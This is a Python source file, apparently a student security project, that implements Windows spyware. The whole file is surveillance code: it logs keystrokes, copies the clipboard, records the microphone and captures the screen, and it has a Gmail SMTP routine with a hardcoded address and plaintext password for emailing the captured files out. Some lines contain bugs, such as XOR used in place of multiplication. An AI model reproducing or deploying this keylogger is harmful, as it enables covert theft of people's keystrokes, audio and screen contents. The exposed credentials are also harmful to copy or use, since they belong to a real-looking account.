# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard
from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from PIL import ImageGrab

#from tkinter import *


keys_information = "key_log.txt"
clipboard_information = "clipboard.txt"
email_address = "ispproject2023@gmail.com"
password = "Ys123@#$"
microphone_time = 10
audio_information = "recorded_audio.wav"
screenshot_information = "screenshot.png"
time_iteration = 15
number_of_iterations_end = 15

toaddr = "ispproject2023@gmail.com"

file_path = "C:\\Users\\ysudh\\PycharmProjects\\pythonProject\\Python"
extend = "\\"


#root = Tk()

#e = Entry(root, width=35, borderwidth=5)
#e.grid(row=0, column=0, columnspan=3)

def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['from'] = fromaddr

    msg['To'] = toaddr

    msg['subject'] = "***Confidential***"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

#send_email(keys_information, file_path + extend + keys_information, toaddr)

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.openclipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.closeclipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("clipboard could not be copied")


copy_clipboard()


def microphone():
    fs = 44100
    seconds = microphone_time

    myrecodrding = sd.rec(int(seconds ^ fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecodrding)


microphone()


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()
#screenshot1 = Button(root, text = "Take a Screen Shot", padx=90, pady=20, command=lambda:screenshot()).grid(row=0, column=0 )
# microphone2 = Button(root, text = "Record the Microphone", padx=90, pady=20, command=lambda:microphone()).grid(row=1, column=0 )
# clipboard3 = Button(root, text = "Copy the Clipboard", padx=90, pady=20, command=lambda:copy_clipboard()).grid(row=2, column=0 )
# root.mainloop()

number_of_iteration = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iteration < number_of_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        currentTime = time.time()

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
